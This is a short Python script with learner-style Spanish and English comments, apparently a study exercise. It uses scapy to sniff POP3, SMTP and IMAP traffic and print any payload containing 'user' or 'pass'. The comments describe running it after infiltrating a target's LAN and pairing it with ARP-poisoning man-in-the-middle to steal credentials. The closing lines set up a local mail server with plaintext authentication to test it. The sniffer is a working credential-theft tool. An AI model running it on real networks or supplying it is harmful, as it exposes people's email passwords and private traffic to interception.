# The modern scapy lib runs on wondows tho fue pensada para Linux
# Estos programas funcionan, suponinedo que que uno se infiltró al LAN del target
# Esto es un sniffer para 𝗦𝗶𝗺𝗽𝗹𝗲 𝗠𝗮𝗶𝗹 𝗧𝗿𝗮𝗻𝘀𝗽𝗼𝗿𝘁 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 (𝗦𝗠𝗧𝗣), 𝗣𝗼𝘀𝘁 𝗢𝗳𝗳𝗶𝗰𝗲 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 (𝗣𝗢𝗣𝟯) 𝘆 𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗔𝗰𝗰𝗲𝘀 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 (𝗜𝗠𝗔𝗣)
# Si a esto se le añade el 𝗔𝗱𝗱𝗿𝗲𝘀 𝗥𝗲𝘀𝗼𝗹𝘂𝘁𝗶𝗼𝗻 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 (𝗔𝗥𝗣)y el ataque poissoning-main-in-the-middle (MITM) cara robar credenciales
# La tecnica funciona para cualquier protocolo pero lo vamos a usar para esto, de momento
from scapy.all import sniff, TCP, IP


# Simple example
def packet_callback0(packet):
    print(packet.show())
    
def packet_callback(packet):
    if packet[TCP].payload: # check that it 𝘩𝘢𝘴 data payload
        package = str(packet[TCP].payload) 
        if 'user' in package.lower() or 'pass' in package.lower(): # check if the payload has the 'user' and 'pass' cmds
            # If auth detected, print out destination and data bytes
            print(f"[*] Destination: {packet[IP].dst}") 
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # Simple example
    # sniff(prn=packet_callback, count=1)
    
    # sniff has 𝟰 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 (but we only ussing 2)
    # 𝘧𝘪𝘭𝘵𝘦𝘳="" -> allows the usser to specify Berckley Packet Filter (BPF) to filter through sniffed packets
    # 𝘪𝘧𝘢𝘤𝘦="" -> tells teh sniffer what network interface to sniff on, blanck==all interfaces
    # 𝘱𝘳𝘯=𝘱𝘢𝘤𝘬𝘦𝘵_𝘤𝘢𝘭𝘭𝘣𝘢𝘤𝘬 -> specifies the function to call when a packet is found. The packet is passed as a single argument
    # 𝘤𝘰𝘶𝘯𝘵=1 -> especifica cuantos paquetes to sniff, blank==indefinidamente (until Ctrl+C)
    
    sniff(filter= 'tcp port 110 or tcp port 25 or tcp port 143',prn=packet_callback, store=0)
    # getting TCP paquets from two way traffic for ports 110 (POP3), 25 (SMTP) and 143 (IMAP)
    # The ports for the protocols we were looking for (related to mailing)
    # 𝘴𝘵𝘰𝘳𝘦=0 -> Ensure that scapy does not keep the packets in mem (𝗯𝗲𝘀𝘁 𝗽𝗿𝗮𝗰𝘁𝗶𝗰𝗲 𝗳𝗼𝗿 𝗹𝗼𝗻𝗴 𝘁𝗲𝗿𝗺 𝘀𝗻𝗶𝗳𝗳𝗶𝗻𝗴)

if __name__=="__main__":
    main()
    
# 𝗡𝗼𝘁𝗲: It's slow (probably due to my CPU, but slow non the less Ɛ( · — ·)3)

# 𝗪𝗶𝗿𝗲𝘀𝗵𝗮𝗿𝗸 𝘀𝘁𝘆𝗹𝗲:
# Used for the filtering (BPF) part of the sniffer
# You can specfy a descriptor, trafic flow direction and the protocol to filter for
# Any and all three of the components can be ommited depending on what we filter for (it's giving AO3)
# 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗼𝗿 -> what your are looking for ie: 𝘩𝘰𝘴𝘵, 𝘯𝘦𝘵, 𝘱𝘰𝘳𝘵
# 𝗗𝗶𝗿𝗲𝗰𝘁𝗶𝗼𝗻 𝗼𝗳 𝘁𝗿𝗮𝘃𝗲𝗹 -> direction of travel: 𝘴𝘳𝘤, 𝘥𝘴𝘵, src and dst
# 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 -> Protocol used to send traffic: 𝘪𝘱, 𝘪𝘱6, 𝘵𝘤𝘱, 𝘶𝘥𝘱

# 𝗧𝗼 𝘁𝗲𝘀𝘁 𝘀𝗶𝗺𝘂𝗹𝗮𝘁𝗶𝗻𝗴 𝗺𝗮𝗶𝗹:
# sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
# sudo apt install dovecot-core dovecot-pop3d postfix
# sudo nano /etc/dovecot/conf.d/10-auth.conf ⁡⁢⁣⁢(LAB ONLY)⁡
    # disable_plaintext_auth = no ⁡⁢⁣⁢(Turn back to 'yes' when done)⁡
    # Ctrl+O Enter Ctrl+X
# sudo systemctl restart dovecot
# telnet localhost 110
    # USER testuser
    # PASS testpass
# sudo python3 mail_sniffer.py <on diff tab>
